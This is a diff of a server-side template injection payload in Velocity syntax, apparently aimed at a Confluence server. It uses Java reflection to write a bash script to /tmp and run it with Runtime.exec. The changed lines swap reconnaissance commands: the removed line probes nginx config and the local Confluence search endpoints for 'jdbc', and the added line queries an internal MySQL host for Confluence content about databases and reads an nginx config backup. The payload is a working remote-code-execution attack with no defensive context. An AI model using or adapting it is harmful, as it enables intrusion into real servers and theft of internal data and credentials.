@@ -1,6 +1,6 @@
 #set($x = "")
 #set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$fw.write("echo ===NGXDIR===; ls -la /etc/nginx/conf.d/ 2>&1|head -15; echo ===LOCAL8090===; curl -s -m 8 -o /dev/null -w 'home=%{http_code}\n' http://localhost:8090/; echo ===CQL===; curl -s -m 10 'http://localhost:8090/rest/api/content/search?cql=text~jdbc&limit=3' 2>&1|head -c 900; echo; echo ===DOSEARCH===; curl -s -m 10 -o /dev/null -w 'dosearch=%{http_code}\n' 'http://localhost:8090/dosearchsite.action?queryString=jdbc'")
+$fw.write("echo ===CNT===; mysql -h10.18.19.53 -D confluence -e 'select count(*) from CONTENT' 2>&1|head -5; echo ===MY===; mysql -h10.18.19.53 -D confluence -e \"select CONTENTID,TITLE from CONTENT where lower(TITLE) like '%mysql%' limit 12\" 2>&1|head -20; echo ===DB===; mysql -h10.18.19.53 -D confluence -e \"select CONTENTID,TITLE from CONTENT where lower(TITLE) like '%database%' or lower(TITLE) like '% db %' limit 12\" 2>&1|head -20; echo ===NGXBAK===; cat /etc/nginx/conf.d/f9ad764e20e911e7aff7.conf.bak 2>&1|head -10")
 $fw.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
